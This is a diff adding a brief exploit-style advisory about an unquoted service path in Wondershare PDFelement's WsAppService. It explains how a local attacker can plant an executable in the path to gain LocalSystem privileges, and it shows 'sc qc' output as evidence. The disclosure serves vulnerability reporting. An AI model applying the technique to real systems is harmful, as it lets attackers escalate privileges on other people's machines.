@@ -1,0 +1,32 @@
+#########################################################################
+# Exploit Title: Wondershare PDFelement Unquoted Service Path Privilege
+Escalation
+# Date: 10/14/2016
+# Author: Saeed Hasanzadeh (Net.Hun73r)
+# Vendor Homepage: https://www.wondershare.com/
+# Software Link:
+http://download.wondershare.com/inst/pdfelement_setup_full1042.exe
+#version : 5.2.9
+# Tested on: Windows 7
+##########################################################################
+
+Wondershare PDFelement installs a service with an unquoted service path
+To properly exploit this vulnerability,
+the local attacker must insert an executable file in the path of the
+service.
+Upon service restart or system reboot, the malicious code will be run
+with elevated privileges.
+-------------------------------------------
+C:\>sc qc WsAppService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: WsAppService
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\Wondershare\WAF\2.2.3.2\WsAppService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Wondershare Application Framework Service
+        DEPENDENCIES       : RPCSS
+        SERVICE_START_NAME : LocalSystem
